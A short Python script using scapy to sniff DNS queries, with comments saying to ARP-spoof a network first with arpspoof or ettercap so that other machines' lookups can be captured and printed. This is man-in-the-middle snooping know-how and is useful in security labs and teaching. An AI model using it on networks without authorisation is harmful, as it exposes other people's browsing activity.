#you should spoof the network before using this script;
#it will sniff all the queries the spoofed network is making;
#use arpsoof in linux or ettercap in windows machine;

from scapy.all import *; #import scapy
def fun(pkt):
        for x in pkt:
                if DNS in pkt: #if the dns pkt is present in the sniffed packets;
                        return pkt[DNS].qd[DNSQR].qname.decode(); #return the dns query sniffed computer is making //www.google.com
sniff(prn=fun); #printing the requested query in terminal
